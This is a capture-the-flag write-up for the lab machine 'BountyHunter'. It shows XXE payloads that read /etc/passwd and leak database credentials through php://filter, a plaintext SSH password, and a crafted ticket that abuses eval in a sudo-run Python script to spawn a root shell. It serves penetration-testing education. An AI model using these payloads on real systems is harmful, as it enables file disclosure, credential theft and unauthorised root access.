@@ -1,0 +1,244 @@
+BountyHunter
+
+ 19th Nov 2021 / Document No. D21.100.142
+ Prepared By: felamos
+ Machine Creator(s): ejedev
+ Difficulty: Easy
+ Classification: Official
+Synopsis
+
+BountyHunter is an easy Linux machine that uses XML external entity injection to read system files. Being
+able to read a PHP file where credentials are leaked gives the opportunity to get a foothold on system as
+development user. A message from John mentions a contract with Skytrain Inc and states about a script that
+validates tickets. Auditing the source code of the python script reveals that it uses the eval function on ticket
+code, which can be injected, and as the python script can be run as root with sudo by the development user
+it is possible to get a root shell.
+
+Skills Required
+
+      Python
+      Basic Linux
+
+Skills Learned
+
+      XXE injection
+      Source code review
+Enumeration
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.129.198.241 | grep ^[0-9] | cut -d '/' -f 1 |
+   tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.129.198.241
+
+Nmap detects two open ports: SSH on port 22 and Apache2 on port 80 by default. We start by browsing at
+port 80.
+
+There is a bug bounty hunting team's webpage. The website contains useful information such as a name
+(John) and the announcement of a Bug Bounty Tracking System that is going to be available shortly. They
+have a Contact us form that doesn't work, so we fire up dirsearch and take a closer look at this site as we
+manually explore it.
+   python3 dirsearch.py -u http://10.129.198.241
+
+The file db.php looks interesting, but we'll have to dig deeper into the resources folder to check what more
+we can find. We can use the same command as before, but we change the directory to enumerate.
+
+   python3 dirsearch.py -u http://10.129.198.241/resources
+Let's have a look at README.txt , which seems interesting.
+   curl http://10.129.198.241/resources/README.txt
+
+There appears to be a test development account that does not require a password. We return to the login
+screen and attempt to get in using the username test and no password; this time it succeeds. We've landed
+at the gateway page. Other than a single sentence referring us to another website, there is no more
+valuable information. Let's go to portal and look around.
+Foothold
+
+Following up on our enumeration, clicking on the portal.php link lead us to a web form that looks to be
+the team's Bounty Tracking System.
+
+We examine how the page behaves when we enter some random data.
+
+Our data would have been uploaded if the database had been available, according to the page message. It's
+possible that the error handling is displaying our data instead of really connecting to the database. Let's
+have a look with Burp tool to better understand how it works.
+We'll intercept the request and send the same information all over again.
+   POST /tracker_diRbPr00f314.php HTTP/1.1
+   Host: 10.129.198.241
+   User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+   Accept: */*
+   Accept-Language: en-US,en;q=0.5
+   Accept-Encoding: gzip, deflate
+   Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+   X-Requested-With: XMLHttpRequest
+   Content-Length: 221
+   Origin: http://10.129.198.241
+   DNT: 1
+   Connection: close
+   Referer: http://10.129.198.241/log_submit.php
+   Sec-GPC: 1
+
+   data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCT
+   x0aXRsZT5zc3M8L3RpdGxlPgoJCTxjd2U%2BZGRkPC9jd2U%2BCgkJPGN2c3M%2BZmZmPC9jdnNzPgoJCTxyZXd
+   hcmQ%2BZ2dnPC9yZXdhcmQ%2BCgkJPC9idWdyZXBvcnQ%2B
+
+This page sends a request to tracker diRbPr00f314.php . The payload appears to be encoded in base64.
+We notice the %3D%3d at the end, so we decode the url first, then the base64 data. When we decode it, we
+get the following information:
+
+   echo 'PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9Ikl<SNIP>' | base64 -d
+The data we entered appears to be in an XML format. Let's try reading a system file by injecting an XXE file.
+   <?xml version="1.0" encoding="ISO-8859-1"?>
+   <!DOCTYPE data [
+   <!ENTITY file SYSTEM "file:///etc/passwd"> ]>
+   <bugreport>
+   <title>test</title>
+      <cwe>test</cwe>
+      <cvss>test</cvss>
+      <reward>&file;</reward>
+   </bugreport>
+
+This XML is encoded, and the base64 should be URL encoded. We put it in a file and again base64 to encode
+it.
+
+   cat /tmp/f.xml | base64 -w 0
+
+We URL encode and using our Burp to send the request to the server.
+   POST /tracker_diRbPr00f314.php HTTP/1.1
+   Host: 10.129.198.241
+   User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+   Accept: */*
+   Accept-Language: en-US,en;q=0.5
+   Accept-Encoding: gzip, deflate
+   Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+   X-Requested-With: XMLHttpRequest
+   Content-Length: 307
+   Origin: http://10.129.198.241
+   DNT: 1
+   Connection: close
+   Referer: http://10.129.198.241/log_submit.php
+   Sec-GPC: 1
+
+   data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRhdGEgWw
+   o8IUVOVElUWSBmaWxlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj4gXT4KPGJ1Z3JlcG9ydD4KPHRpdGxlP
+   nRlc3Q8L3RpdGxlPgogIDxjd2U%2bdGVzdDwvY3dlPgogIDxjdnNzPnRlc3Q8L2N2c3M%2bCiAgPHJld2FyZD4m
+   ZmlsZTs8L3Jld2FyZD4KPC9idWdyZXBvcnQ%2bCg%3d%3d
+
+and indeed this was the response that we got.
+
+   root:x:0:0:root:/root:/bin/bash
+   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+   bin:x:2:2:bin:/bin:/usr/sbin/nologin
+   sys:x:3:3:sys:/dev:/usr/sbin/nologin
+   sync:x:4:65534:sync:/bin:/bin/sync
+   games:x:5:60:games:/usr/games:/usr/sbin/nologin
+   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+   uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+   proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+   <SNIP>
+   pollinate:x:110:1::/var/cache/pollinate:/bin/false
+   sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+   systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+   development:x:1000:1000:Development:/home/development:/bin/bash
+   lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+   usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+
+Now we'll be able to read any file we have access with this XXE injection. We can also try to read the db.php
+file, and as this is an apache2 server, we are going to try by selecting /var/www/html/ path. First though we
+need to base64 encode it using the php filter.
+
+   <?xml version="1.0" encoding="ISO-8859-1"?>
+   <!DOCTYPE data [
+   <!ENTITY file SYSTEM "php://filter/read=convert.base64-
+   encode/resource=/var/www/html/db.php"> ]>
+   <bugreport>
+   <title>test</title>
+
+      <cwe>test</cwe>
+      <cvss>test</cvss>
+      <reward>&file;</reward>
+   </bugreport>
+
+And now we can sent it.
+
+   POST /tracker_diRbPr00f314.php HTTP/1.1
+   Host: 10.129.198.241
+   User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+   Accept: */*
+   Accept-Language: en-US,en;q=0.5
+   Accept-Encoding: gzip, deflate
+   Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+   X-Requested-With: XMLHttpRequest
+   Content-Length: 375
+   Origin: http://10.129.198.241
+   DNT: 1
+   Connection: close
+   Referer: http://10.129.198.241/log_submit.php
+   Sec-GPC: 1
+   data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRhdGEgWw
+   o8IUVOVElUWSBmaWxlIFNZU1RFTSAicGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc
+   291cmNlPS92YXIvd3d3L2h0bWwvZGIucGhwIj4gXT4KPGJ1Z3JlcG9ydD4KPHRpdGxlPnRlc3Q8L3RpdGxlPgog
+   IDxjd2U%2bdGVzdDwvY3dlPgogIDxjdnNzPnRlc3Q8L2N2c3M%2bCiAgPHJld2FyZD4mZmlsZTs8L3Jld2FyZD4
+   KPC9idWdyZXBvcnQ%2bCg%3d%3d
+Again we need to decode the base64 data we received.
+   echo 'PD9waHAKLy8gVE9ETyAtPiBJbXBsZ<SNIP>' | base64 -d
+
+It seems that we got some credentials and now it is possible to check if we can login. We are spraying this
+password to system users we got from the /etc/passwd file and indeed we manage to get a successful
+login with the user development .
+
+   ssh development@10.129.198.241
+   password: m19RoAU0hP41A1sTsq6K
+Finally user flag can be found at /home/development/user.txt .
+Privilege Escalation
+
+After performing some basic enumeration we locate the file Contract.txt in development's user home
+directory. Let's take a closer look.
+
+   cat contract.txt
+
+This text file contains information on John's contract with Skytrain Inc, as well as a "rm -rf" event. They also
+suggest an internal tool that we can investigate. Let's have a look at the project folder, which can be found
+at /opt/skytrain inc/ and can be found while enumerating the file system.
+
+   ls -la /opt/skytrain_inc/
+
+We spot a python script called ticketValidator.py and inside the invalid_tickets folder some
+sample invalid tickets. We are going to perform a code review to the python script in order to spot any
+vulnerabilities. We notice an eval function in it.
+
+   validationNumber = eval(x.replace("**", ""))
+We also examine the ticket code to discover how it is calculated by the script.
+   if int(ticketCode) % 7 == 4:
+
+This code verifies that the ticket number is divisible by seven and contains four remainders.
+   if validationNumber > 100:
+
+Also this is a supplementary check, and it simply implies that the number one chooses must also be more
+than the value of 100.
+It is conceivable to create a ticket and have it run, but since this file is run by root, we can check at sudoers if
+it is possible to discover a way to execute it.
+
+   sudo -l
+
+We can run python3.8 with a fixed parameter pointing to the ticketvalidator python script. Because the
+script is eval'ing the ticket code, let's make a ticket and put it in the /tmp folder.
+
+   # Skytrain Inc
+   ## Ticket to Mars
+   __Ticket Code:__
+   **179+ 25 == 204 and __import__('os').system('id') == True
+The os import isn't used in the original application, but we will do it ourselves. Import('os') can be used. To
+run code, use system(). To calculate the ticket code, we'll use the formula x=7(y)+4, where x is the number
+and y is the quotient. Any actual number can be added to calculate. 7(25)+4=179, for example.
+   sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+This is a success. Now we can change id to /bin/bash and get an interactive root shell.
+   # Skytrain Inc
+   ## Ticket to Mars
+   __Ticket Code:__
+   **179+ 25 == 204 and __import__('os').system('/bin/bash') == True
+
+Root flag can be found at /root/root.txt
+
